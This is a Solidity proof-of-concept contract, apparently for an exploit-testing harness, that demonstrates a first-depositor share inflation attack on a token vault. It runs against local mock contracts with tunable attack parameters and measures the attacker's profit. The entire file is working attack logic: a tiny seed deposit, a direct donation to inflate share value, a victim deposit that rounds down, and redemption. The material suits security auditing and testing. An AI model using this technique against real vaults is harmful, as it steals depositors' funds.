// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {MockToken} from "../src/MockToken.sol";
import {ShareVault} from "../src/ShareVault.sol";

/// @notice First-depositor share inflation: the attacker opens the vault with a tiny deposit,
///         then pays tokens into it directly, so that one share is worth more than a later
///         deposit and that deposit rounds down to too few shares, or none.
/// Knobs:
///   0 `seed`      the attacker's first deposit, in wei;
///   1 `donation`  tokens the attacker pays into the vault directly, in wei.
/// The victim's deposit of 5 tokens is already waiting when the attacker moves. After it, the
/// attacker redeems all its shares.
contract ShareInflationPoC is AssayPoC {
    uint256 private constant VICTIM_DEPOSIT = 5 ether;

    MockToken internal token;
    ShareVault internal vault;
    address internal victim;

    function setUpTarget() internal override {
        token = new MockToken();
        vault = new ShareVault(token);
        victim = makeAddr("victim");
        token.mint(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "seed", 1, 1, 1e6);
        declareKnob(1, "donation", 10 ether, 1, 10_000 ether);
    }

    function exploit() internal override {
        uint256 seed = knob(0);
        uint256 donation = knob(1);
        token.mint(attacker, seed + donation);
        uint256 balanceBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        token.approve(address(vault), seed);
        vault.deposit(seed, attacker);
        token.transfer(address(vault), donation);
        vm.stopPrank();

        vm.prank(victim);
        vault.deposit(VICTIM_DEPOSIT, victim);

        vm.startPrank(attacker);
        vault.redeem(vault.balanceOf(attacker), attacker);
        vm.stopPrank();

        attacker_profit("asset", balanceBefore, token.balanceOf(attacker));
    }
}
